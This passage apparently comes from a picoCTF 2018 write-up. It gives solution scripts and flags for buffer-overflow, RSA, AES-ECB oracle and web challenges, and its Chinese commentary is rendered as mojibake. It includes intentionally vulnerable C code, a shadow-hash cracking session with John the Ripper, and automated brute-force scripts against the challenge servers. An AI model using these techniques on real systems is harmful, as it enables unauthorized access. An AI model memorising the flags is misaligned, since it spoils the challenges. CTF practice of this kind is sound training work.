class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</span><br><span class="line">din=lines[<span class="number">-3</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]</span><br><span class="line">r.sendline(solve(din))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p><code>picoCTF{5cr1pt1nG_l1k3_4_pRo_cde4078d}</code> </p><h1 id="binary-exploitation"><a href="#binary-exploitation" class="headerlink" title="binary exploitation"></a>binary exploitation</h1><h2 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h2><p><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigsegv_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Thanks! Received: %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This program takes 1 argument.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Crypto-Warmup-1"><a href="#Crypto-Warmup-1" class="headerlink" title="Crypto Warmup 1"></a>Crypto Warmup 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"picoCTF&#123;%s&#125;"</span>%<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr((ord(x[<span class="number">0</span>])-ord(x[<span class="number">1</span>]))%<span class="number">26</span>+ord(<span class="string">'a'</span>)),zip(<span class="string">'llkjmlmpadkkc'</span>,<span class="string">'thisisalilkey'</span>))).upper()</span><br><span class="line">picoCTF&#123;SECRETMESSAGE&#125;</span><br></pre></td></tr></table></figure><h2 id="caesar-cipher-2"><a href="#caesar-cipher-2" class="headerlink" title="caesar cipher 2"></a>caesar cipher 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr((ord(x)+<span class="number">32</span>)%<span class="number">0xff</span>),<span class="string">'PICO#4&amp;[C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%]'</span>))</span><br><span class="line"><span class="comment"># 'picoCTF&#123;cAesaR_CiPhErS_juST_aREnT_sEcUrE&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="hertz"><a href="#hertz" class="headerlink" title="hertz"></a>hertz</h2><p>ÊõøÊç¢ÂØÜÁ†Å„ÄÇ</p><p>Âú®Á∫øÂ∑•ÂÖ∑Ôºö</p><ul><li><a href="https://www.guballa.de/substitution-solver" target="_blank" rel="noopener">https://www.guballa.de/substitution-solver</a> </li><li><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a> </li></ul><p><img src="1541076904847.png" alt="1541076904847"></p><h2 id="blaise‚Äôs-cipher"><a href="#blaise‚Äôs-cipher" class="headerlink" title="blaise‚Äôs cipher"></a>blaise‚Äôs cipher</h2><p>Âú®Á∫øËß£ÂØÜÂç≥ÂèØÔºö<a href="https://www.dcode.fr/vigenere-cipher" target="_blank" rel="noopener">https://www.dcode.fr/vigenere-cipher</a> „ÄÇÈÄêÊ≠•ÂæóÂà∞KEYÈïøÂ∫¶‰∏∫4ÔºåKEY‰∏∫<code>FLAG</code></p><p><code>picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}</code> </p><p>## </p><h2 id="Safe-RSA"><a href="#Safe-RSA" class="headerlink" title="Safe RSA"></a>Safe RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii</span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=<span class="number">2205316413931134031046440767620541984801091216351222789180593875373829950860542792110364325728088504479780803714561464250589795961097670884274813261496112882580892020487261058118157619586156815531561455215290361274334977137261636930849125</span></span><br><span class="line">m=gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(hex(m).strip(<span class="string">'lL'</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="comment"># picoCTF&#123;e_w4y_t00_sm411_9f5d2464&#125;</span></span><br></pre></td></tr></table></figure><h2 id="„ÄêX„ÄëSuper-Safe-RSA"><a href="#„ÄêX„ÄëSuper-Safe-RSA" class="headerlink" title="„ÄêX„ÄëSuper Safe RSA"></a>„ÄêX„ÄëSuper Safe RSA</h2><p>ÂèÇËÄÉ<a href="https://findneo.github.io/180727rsa-attack/#ÂπøÊí≠ÊîªÂáª">RSAÁöÑÂπøÊí≠ÊîªÂáª</a> „ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2,re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> connect</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">c=[]</span><br><span class="line">n=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'buf'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        j=i.strip().split(<span class="string">' '</span>)</span><br><span class="line">        c.append(int(j[<span class="number">0</span>]))</span><br><span class="line">        n.append(int(j[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"mytag:"</span>,len(c)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'buf'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> len(c)&lt;<span class="number">65538</span>:</span><br><span class="line">        r=connect(<span class="string">'2018shell2.picoctf.com'</span>,<span class="number">24039</span>)</span><br><span class="line">        res=r.recv()</span><br><span class="line">        g=re.findall(<span class="string">'c: (\d+)\nn: (\d+)\n.*'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        f.write(<span class="string">' '</span>.join(g)+<span class="string">'\n'</span>)</span><br><span class="line">        c.append(g[<span class="number">0</span>])</span><br><span class="line">        n.append(g[<span class="number">1</span>])</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="comment"># sleep(0.1)</span></span><br><span class="line">        <span class="keyword">if</span> len(c)%<span class="number">1000</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'mytag:'</span>,len(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,aiÂàÜÂà´Ë°®Á§∫Ê®°Êï∞ÂíåÂèñÊ®°ÂêéÁöÑÂÄº,ÈÉΩ‰∏∫ÂàóË°®ÁªìÊûÑ</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#‰∏çÊàêÁ´ãÂàô‰∏çÂ≠òÂú®Ëß£</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(Ëß£,ÊúÄÂ∞èÂÖ¨ÂÄçÊï∞)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> GCRT(n,c)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h2 id="HEEEEEEERE‚ÄôS-Johnny"><a href="#HEEEEEEERE‚ÄôS-Johnny" class="headerlink" title="HEEEEEEERE‚ÄôS Johnny!"></a>HEEEEEEERE‚ÄôS Johnny!</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz .</span><br><span class="line">gunzip rockyou.txt.gz</span><br><span class="line">unshadow passwd shadow &gt; unshadowes.txt</span><br><span class="line">john --wordlist=~/mywordlists/rockyou.txt --rules unshadowes.txt</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"sha512crypt"</span>, but the string is also recognized as <span class="string">"crypt"</span></span><br><span class="line">Use the <span class="string">"--format=crypt"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">thematrix        (root)</span><br><span class="line">1g 0:00:00:16 DONE (2018-10-10 10:04) 0.06002g/s 660.7p/s 660.7c/s 660.7C/s kenya..saavedra</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">nc 2018shell2.picoctf.com 38860</span><br><span class="line">Username: root</span><br><span class="line">Password: thematrix</span><br><span class="line">picoCTF&#123;J0hn_1<span class="variable">$_R1pp3d_4e5aa29e</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="rsa-madlibs"><a href="#rsa-madlibs" class="headerlink" title="rsa-madlibs"></a>rsa-madlibs</h2><p>ÂõûÁ≠î‰∏Ä‰∫õÁÆÄÂçïÁöÑRSAÁü•ËØÜ„ÄÇÂèØ‰ª•ÂèÇËÄÉ<a href="https://findneo.github.io/180727rsa-attack/">CTF‰∏≠Â∏∏ËßÅÁöÑRSAÁõ∏ÂÖ≥ÈóÆÈ¢òÊÄªÁªì</a> ‰∏ÄÊñá„ÄÇ</p><p>ÂèëÁé∞‰∏Ä‰∏™ÂÅöËøôÁ±ªÈ¢òÁõÆÁöÑÂ•ΩÊñπÊ≥ïÔºå<code>python solve.py | nc 2018shell2.picoctf.com 18148</code> Ôºå‰∏çÂà∞ÂøÖË¶ÅÂ∞±‰∏çÂéªÂ§ÑÁêÜÂêÑÁßçÂ•áÊÄ™ÁöÑÊï∞ÊçÆ„ÄÇ</p><p><code>picoCTF{d0_u_kn0w_th3_w@y_2_RS@_b38be18a}</code> </p><h2 id="SpyFi"><a href="#SpyFi" class="headerlink" title="SpyFi"></a>SpyFi</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2 -u</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">agent_code = <span class="string">"""flag"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(message) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        message = message + <span class="string">'0'</span>*(<span class="number">16</span> - len(message)%<span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = AES.new( key.decode(<span class="string">'hex'</span>), AES.MODE_ECB )</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(plain).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">welcome = <span class="string">"Welcome, Agent 006!"</span></span><br><span class="line"><span class="keyword">print</span> welcome</span><br><span class="line"></span><br><span class="line">sitrep = raw_input(<span class="string">"Please enter your situation report: "</span>)</span><br><span class="line">message = <span class="string">"""Agent,</span></span><br><span class="line"><span class="string">Greetings. My situation report is as follows:</span></span><br><span class="line"><span class="string">&#123;0&#125;</span></span><br><span class="line"><span class="string">My agent identifying code is: &#123;1&#125;.</span></span><br><span class="line"><span class="string">Down with the Soviets,</span></span><br><span class="line"><span class="string">006</span></span><br><span class="line"><span class="string">"""</span>.format( sitrep, agent_code )</span><br><span class="line"></span><br><span class="line">message = pad(message)</span><br><span class="line"><span class="keyword">print</span> encrypt( <span class="string">"""key"""</span>, message )</span><br></pre></td></tr></table></figure><p>AESÁöÑECBÊ®°ÂºèÂ≠òÂú®ÈÄâÊã©ÊòéÊñáÊîªÂáª„ÄÇ</p><p>ÂΩìËæìÂÖ•9‰∏™Â≠óËäÇÊó∂Ôºåmessage‰∏≠flag‰πãÂ§ñÁöÑÈÉ®ÂàÜÈïøÂ∫¶‰∏∫122‰∏™Â≠óËäÇÔºåÂØÜÊñáÈïøÂ∫¶‰∏∫160‰∏™Â≠óËäÇÔºõÂΩìËæìÂÖ•10‰∏™Â≠óËäÇÊó∂ÔºåÂØÜÊñáÈïøÂ∫¶‰∏∫176‰∏™Â≠óËäÇ„ÄÇËØ¥ÊòéflagÈïøÂ∫¶‰∏∫160-122=38‰∏™Â≠óËäÇ„ÄÇ</p><p><img src="1538925911862.png" alt="1538925911862"></p><p>Â∞ÜmessageÂàÜÁªÑËæìÂá∫ÔºåÁúãÂà∞ÁàÜÁ†¥flagÁöÑÊú∫‰ºö„ÄÇ</p><p><img src="1538929635797.png" alt="1538929635797"></p><p>ÂÜôÂÆå‰ª£Á†ÅÈ™åËØÅÂèØË°å„ÄÇ</p><p><img src="1538934008777.png" alt="1538934008777"></p><p>ÊúÄÂêéÊàêÊûúÔºö</p><p><code>picoCTF{@g3nt6_1$_th3_c00l3$t_8124762}</code> </p><p><img src="1538938179361.png" alt="1538938179361"></p><p><img src="1538938605546.png" alt="1538938605546"></p><p>ÂÖ®ÈÉ®‰ª£Á†ÅÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">part_msg</span><span class="params">(message,part_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">sl=len(message)</span><br><span class="line">pl=part_length </span><br><span class="line">m=[message[pl*i:min(sl,pl*i+pl)] <span class="keyword">for</span> i <span class="keyword">in</span> range(sl/pl+(sl%pl&gt;<span class="number">0</span>))]</span><br><span class="line"><span class="keyword">return</span> m</span><br><span class="line">msg=[<span class="string">'Agent,\nGreetings. My situation report is as follows:\n'</span>,<span class="string">'\nMy agent identifying code is: '</span>,<span class="string">'.\nDown with the Soviets,\n006\n'</span>,]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> connect</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line">flag=<span class="string">'picoCTF&#123;@'</span></span><br><span class="line"><span class="comment"># sitrep,agent_code='',''</span></span><br><span class="line"><span class="comment"># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">38</span>-len(flag)):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line"><span class="comment"># print "flag:",i</span></span><br><span class="line">r=connect(<span class="string">"2018shell2.picoctf.com"</span>,<span class="number">37131</span>)</span><br><span class="line">cnt+=<span class="number">1</span>;time.sleep(<span class="number">1</span>)</span><br><span class="line">prompt=r.recvuntil(<span class="string">"report: "</span>)</span><br><span class="line"><span class="comment"># 113 + (11+16+38+10)  + 38 = 226</span></span><br><span class="line">base=<span class="string">'fying code is: '</span>+flag</span><br><span class="line">sitrep=<span class="string">'@'</span>*<span class="number">11</span>+base[<span class="number">-15</span>:]+i+<span class="string">'@'</span>*(<span class="number">38</span>-len(flag)+<span class="number">10</span>)</span><br><span class="line"><span class="comment"># agent_code="#"*38</span></span><br><span class="line"><span class="comment"># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span></span><br><span class="line"><span class="comment"># print '\n'.join(map(repr,part_msg(message)))</span></span><br><span class="line">r.sendline(sitrep)</span><br><span class="line">response=r.recv()</span><br><span class="line"><span class="comment"># print len(response)</span></span><br><span class="line">tmp=part_msg(response,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># print len(tmp)</span></span><br><span class="line"><span class="comment"># print '\n'.join(tmp)</span></span><br><span class="line">r.close()</span><br><span class="line"><span class="comment"># print len(msg[0]+sitrep+msg[1]+flag)/16</span></span><br><span class="line"><span class="keyword">if</span> tmp[<span class="number">4</span>]==tmp[len(msg[<span class="number">0</span>]+sitrep+msg[<span class="number">1</span>]+flag)/<span class="number">16</span>]:</span><br><span class="line">flag+=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,flag,cnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,time.asctime()</span><br><span class="line">solve()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,time.asctime()</span><br></pre></td></tr></table></figure><h1 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h1><h2 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://2018shell2.picoctf.com:65107/button2.php --data <span class="string">"123"</span></span><br><span class="line">Well <span class="keyword">done</span>, your flag is: picoCTF&#123;button_button_whose_got_the_button_91f6f39a&#125;</span><br></pre></td></tr></table></figure><h2 id="Artisinal-Handcrafted-HTTP-3"><a href="#Artisinal-Handcrafted-HTTP-3" class="headerlink" title="Artisinal Handcrafted HTTP 3"></a>Artisinal Handcrafted HTTP 3</h2><p>ÂÖàËØ∑Ê±Ç‰∏Ä‰∏ãloginÈ°µÈù¢Ôºö</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br></pre></td></tr></table></figure><p>ÂèëÁé∞Ë°®ÂçïÊòØËøôÊ†∑ÁöÑÔºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">x-powered-by: Express</span><br><span class="line">content-type: text/html; charset=utf<span class="number">-8</span></span><br><span class="line">content-length: <span class="number">498</span></span><br><span class="line">etag: W/<span class="string">"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"</span></span><br><span class="line">date: Sun, <span class="number">07</span> Oct <span class="number">2018</span> <span class="number">18</span>:<span class="number">33</span>:<span class="number">21</span> GMT</span><br><span class="line">connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"main.css"</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;header&gt;</span><br><span class="line">&lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">"/login"</span>&gt;Login&lt;/a&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">&lt;main&gt;</span><br><span class="line">&lt;h2&gt;Log In&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">"login"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"user"</span> placeholder=<span class="string">"Username"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"password"</span> name=<span class="string">"pass"</span> placeholder=<span class="string">"Password"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/main&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ÂÜçËØ∑Ê±ÇÁôªÈôÜÔºö</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">user=realbusinessuser&amp;pass=potoooooooo</span><br></pre></td></tr></table></figure><p>ÂìçÂ∫îÔºö</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">x-powered-by</span>: Express</span><br><span class="line"><span class="attribute">set-cookie</span>: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br><span class="line"><span class="attribute">location</span>: /</span><br><span class="line"><span class="attribute">vary</span>: Accept</span><br><span 